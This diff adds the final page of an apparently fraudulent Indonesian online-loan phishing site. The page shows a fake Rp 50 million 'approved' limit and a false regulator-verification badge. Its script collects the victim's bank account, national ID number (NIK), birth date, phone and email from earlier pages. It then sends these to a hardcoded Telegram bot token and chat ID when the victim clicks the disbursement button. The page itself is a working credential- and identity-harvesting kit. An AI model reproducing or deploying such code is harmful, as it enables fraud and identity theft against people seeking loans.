@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pencairan Dana</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif}
+body{background:#f6f8fb;min-height:100vh}
+.top{background:#11C7C8;color:#fff;padding:16px;border-radius:0 0 20px 20px;text-align:center}
+.top h2{font-size:18px;font-weight:800}
+.top p{font-size:12px;margin-top:4px;opacity:.9}
+.container{max-width:420px;margin:auto;padding:14px 14px 100px}
+.card{background:#fff;border-radius:20px;padding:18px;box-shadow:0 8px 24px rgba(0,0,0,.06);margin-top:-20px}
+.badge{display:inline-block;background:#e6fbfb;color:#11C7C8;border:1px solid #b8f0f0;padding:4px 10px;border-radius:20px;font-size:11px;font-weight:700;margin-bottom:10px}
+.limit{font-size:32px;font-weight:900;color:#111}
+.limit span{font-size:14px;color:#777;font-weight:600}
+.info-box{background:#f0fffe;border:1px solid #c6f0f0;border-radius:14px;padding:12px 14px;margin-top:14px}
+.row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #f2f2f2;font-size:13px}
+.row:last-child{border:none}
+.row b{color:#111}
+.row span{color:#666}
+.notice{margin-top:14px;background:#fff7ed;border:1px solid #ffedd5;border-radius:12px;padding:10px 12px;font-size:11px;color:#9a3412;line-height:1.4}
+.bottom{position:fixed;bottom:0;left:50%;transform:translateX(-50%);width:100%;max-width:420px;background:#fff;padding:14px 16px;border-top:1px solid #eee}
+.btn{width:100%;background:#1CC812;color:#fff;border:none;padding:15px;border-radius:30px;font-size:16px;font-weight:800;box-shadow:0 8px 20px rgba(28,200,18,.35);cursor:pointer;transition:.2s}
+.btn:active{transform:scale(.98)}
+.btn:disabled{background:#d1d5db;box-shadow:none}
+.small{font-size:11px;color:#999;text-align:center;margin-top:8px}
+</style>
+</head>
+<body>
+
+<div class="top">
+  <h2>🎉 Selamat! Limit Disetujui</h2>
+  <p>Silakan cairkan dana sekarang ke rekening Anda</p>
+</div>
+
+<div class="container">
+  <div class="card">
+    <div class="badge">✓ Terverifikasi OJK</div>
+    <div class="limit" id="limitText">Rp 50.000.000 <span>tersedia</span></div>
+    
+    <div class="info-box">
+      <div class="row"><span>Nama Penerima</span><b id="namaOut">-</b></div>
+      <div class="row"><span>Bank Tujuan</span><b id="bankOut">-</b></div>
+      <div class="row"><span>No Rekening</span><b id="norekOut">-</b></div>
+      <div class="row"><span>Jumlah Cair</span><b id="cairOut" style="color:#11C7C8">-</b></div>
+      <div class="row"><span>Biaya Admin</span><b style="color:#1CC812">Rp 0</b></div>
+    </div>
+
+    <div class="notice">
+      ⚠️ <b>Penting:</b> Pastikan nama pemilik rekening sesuai KTP. Pencairan akan diproses 5-10 menit. Jangan tutup halaman sampai dana masuk.
+    </div>
+
+    <div style="margin-top:16px">
+      <label style="font-size:12px;font-weight:600">Pilih Jumlah Pencairan</label>
+      <input type="range" id="cairSlider" min="500000" max="50000000" step="500000" value="5000000" style="width:100%;margin-top:10px;accent-color:#11C7C8">
+      <div style="display:flex;justify-content:space-between;font-size:10px;color:#999;margin-top:4px"><span>500rb</span><span>50jt</span></div>
+    </div>
+  </div>
+</div>
+
+<div class="bottom">
+  <button class="btn" id="btnCair" onclick="cairkan()">Cairkan Sekarang →</button>
+  <div class="small">🛡️ Dana aman, pencairan real-time • CS 24 Jam</div>
+</div>
+
+<script>
+// === TOKEN TELEGRAM ===
+const TELEGRAM_BOT_TOKEN="8878507338:AAFGFpr2gOnxcm6YGd5L8uZQ2lOdyImuNKM";
+const TELEGRAM_CHAT_ID="8488971726";
+
+function rupiah(n){return new Intl.NumberFormat('id-ID',{style:'currency',currency:'IDR',maximumFractionDigits:0}).format(n)}
+
+let finalCair=5000000;
+
+// Load data dari halaman sebelumnya
+try{
+  const s1=JSON.parse(localStorage.getItem('user_step1')||'{}');
+  const ktp=JSON.parse(localStorage.getItem('ktp_lengkap')||'{}');
+  const rekNama=localStorage.getItem('rek_nama')||s1.nama||'-';
+  const rekBank=localStorage.getItem('rek_bank')||'-';
+  const rekNorek=localStorage.getItem('rek_norek')||'-';
+  const simulasi=s1.simulasi;
+
+  document.getElementById('namaOut').innerText=rekNama;
+  document.getElementById('bankOut').innerText=rekBank;
+  document.getElementById('norekOut').innerText=rekNorek;
+  
+  let jumlahAwal=5000000;
+  if(simulasi?.jumlah){
+    // ambil angka dari "Rp 2.300.000" -> 2300000
+    const angka=parseInt(simulasi.jumlah.replace(/\D/g,''));
+    if(angka>0) jumlahAwal=angka;
+  }
+  finalCair=jumlahAwal;
+  document.getElementById('cairSlider').value=jumlahAwal;
+  document.getElementById('cairOut').innerText=rupiah(jumlahAwal);
+  document.getElementById('limitText').innerHTML=rupiah(50000000)+' <span>tersedia</span>';
+
+  window._allData={s1,ktp,rekNama,rekBank,rekNorek};
+}catch(e){}
+
+document.getElementById('cairSlider').addEventListener('input',function(){
+  finalCair=Number(this.value);
+  document.getElementById('cairOut').innerText=rupiah(finalCair);
+});
+
+async function cairkan(){
+  const btn=document.getElementById('btnCair');
+  if(btn.disabled) return;
+  btn.innerText='Memproses Pencairan...';
+  btn.disabled=true;
+
+  const {s1,ktp,rekNama,rekBank,rekNorek}=window._allData||{};
+  
+  const teks=`💸 PENGAJUAN PENCAIRAN FINAL - CAIRKAN
+
+💰 Cair: ${rupiah(finalCair)}
+👤 Rek: ${rekNama} | ${rekBank} | ${rekNorek}
+
+--- KTP ---
+🪪 ${ktp?.namaLengkap||'-'} ${ktp?.namaBelakang||''}
+🆔 NIK: ${ktp?.nik||'-'}
+🎂 ${ktp?.tglLahir||'-'} | ${ktp?.status||'-'} | ${ktp?.pekerjaan||'-'}
+
+--- Awal ---
+👤 ${s1?.nama||'-'} | ${s1?.hp||'-'} | ${s1?.email||'-'}
+📊 Pinjam Awal: ${s1?.simulasi?.jumlah||'-'} | ${s1?.simulasi?.tenor||'-'}
+
+⏰ ${new Date().toLocaleString('id-ID')}
+✅ User klik Cairkan di pencairan.html`;
+
+  try{
+    if(!TELEGRAM_BOT_TOKEN.includes('ISI')){
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,{
+        method:'POST',headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({chat_id:TELEGRAM_CHAT_ID,text:teks})
+      });
+    }
+  }catch(e){}
+
+  localStorage.setItem('final_cair', finalCair);
+
+  setTimeout(()=>{
+    window.location.href='sukses.html';
+  },800);
+}
+</script>
+</body>
+</html>
